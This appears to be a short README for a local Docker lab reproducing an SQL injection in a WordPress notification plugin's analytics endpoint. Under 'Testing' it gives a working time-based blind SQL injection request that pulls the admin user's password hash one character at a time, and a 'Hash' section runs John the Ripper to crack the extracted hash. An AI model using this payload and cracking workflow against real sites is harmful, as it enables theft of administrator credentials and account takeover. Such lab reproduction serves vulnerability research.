## Set-up

```
docker-compose up --build
```

## Clean up
```
docker-compose down
```

## Testing

```
Measure-Command {
    curl.exe http://localhost/wp-json/notificationx/v1/analytics `
        -Method Post `
        -Body 'nx_id=1337&type=clicks`=IF(ASCII(SUBSTRING((select user_pass from wp_users where id=1),1,1))=36,SLEEP(10),null)-- -'
}
```


## Hash

del "C:\Users\Jesica Tjan\Downloads\winX64_1_JtR\JtR\run\john.pot"
john --show hash.txt